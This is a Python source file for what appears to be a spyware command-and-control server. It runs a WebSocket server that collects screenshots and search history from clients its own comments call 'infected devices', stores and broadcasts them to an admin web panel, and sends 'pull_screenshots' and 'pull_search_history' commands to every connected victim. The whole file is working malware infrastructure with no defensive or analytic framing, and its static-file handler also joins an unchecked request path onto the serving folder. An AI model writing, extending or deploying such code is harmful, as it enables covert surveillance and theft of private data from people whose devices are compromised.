import base64
import json
import asyncio
from aiohttp import web
import websockets
import logging
import os


connected_clients = set()
screenshot_store = []

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("websocket_server")

async def broadcast(message):
    for client in connected_clients:
        try:
            await client.send(json.dumps(message))
        except websockets.exceptions.ConnectionClosed:
            logger.warning("Failed to send message to a client. Client disconnected.")


async def handle_client(websocket):
    # Add the client to the connected clients set
    connected_clients.add(websocket)
    logger.info("New client connected.")
    
    try:
        while True:
            # Wait for a message from the client
            client_message = await websocket.recv()
            logger.info(f"Received raw message from client: {client_message}")
            
            try:
                # Parse the JSON message
                data = json.loads(client_message)
                command = data.get("command")
                payload = data.get("payload")
                logger.info(f"Received command: {command}")
                
                if command == "screenshot":
                    # Decode Base64 screenshot and save it to the store
                    screenshot_store.append(payload)  

                    #Limit the number of stored screenshots
                    if len(screenshot_store) > 10:  
                        screenshot_store.pop(0)

                    # Broadcast all screenshots to the admin interface
                    admin_message = {
                        "event": "screenshot_update",
                        "payload": screenshot_store  
                    }
                    await broadcast(admin_message)

                elif command == "search_history":
                    response = {"command": "search_history"}
                    save_search_history(payload)

                    # Broadcast the search history to the admin interface (this is kinda meh implementation because it also broadcasts to infected devices, 
                    # should work for now but ill look into it at some point)
                    await broadcast({"command": "search_history"})

                #not sure if notifying clients of errors really is a great idea :D
                else:
                    response = {"command": "error"}
                
                # Send the JSON response back to the client
                await websocket.send(json.dumps(response))
                logger.info(f"Sent message to client: {response}")

            except json.JSONDecodeError:
                # Handle invalid JSON
                error_response = {"command": "error"}
                await websocket.send(json.dumps(error_response))
                logger.error(f"Invalid JSON received: {client_message}")

    except websockets.exceptions.ConnectionClosed as e:
        logger.info(f"Client disconnected: {e}")
    finally:
        # Remove the client from the connected clients set
        connected_clients.remove(websocket)
        logger.info("Client removed from connected clients.")

# HTTP handler to serve static files
async def handle_static_files(request):
    file_path = os.path.join("static", request.match_info["filename"])
    if not os.path.exists(file_path):
        return web.Response(text="File not found", status=404)

    return web.FileResponse(file_path)

# Function to send a command to all connected clients
async def send_command_to_all(command):
    message = {
        "command": command
    }
    for client in connected_clients:
        try:
            await client.send(json.dumps(message))
            logger.info(f"Sent {command} command to client: {message}")
        except websockets.exceptions.ConnectionClosed:
            logger.warning("Failed to send command to a client. Client disconnected.")

# Not used at the moment, but might become useful down the road
async def send_command_to_client(client, command, payload=None):
    message = {
        "command": command,
        "payload": payload or {}
    }
    try:
        await client.send(json.dumps(message))
        logger.info(f"Sent {command} command to specific client: {message}")
    except websockets.exceptions.ConnectionClosed:
        logger.warning("Failed to send command to the client. Client disconnected.")

# Defined commands we can send to (infected) clients
async def pull_screenshots():
    await send_command_to_all("pull_screenshots")

async def pull_history():
    await send_command_to_all("pull_search_history")

# Save the search history to a text file
def save_search_history(history_data):
    try:
        with open("search_history.txt", "a") as file:
            file.write(f"{history_data}\n")
        logger.info("Search history saved to file.")
    except Exception as e:
        logger.error(f"Failed to save search history: {e}")

# Start WebSocket server and HTTP server for admin interface
async def main():
    # Start WebSocket server
    await websockets.serve(handle_client, "localhost", 8765)
    logger.info("WebSocket server started on ws://localhost:8765/")

    # Start HTTP server
    app = web.Application()
    app.router.add_get("/{filename}", handle_static_files)
    runner = web.AppRunner(app)
    await runner.setup()
    http_server = web.TCPSite(runner, "localhost", 8080)
    await http_server.start()
    logger.info("Admin interface available at http://localhost:8080/admin.html")
    
    # Run forever
    await asyncio.Future()

# Run the WebSocket server
if __name__ == "__main__":
    asyncio.run(main())
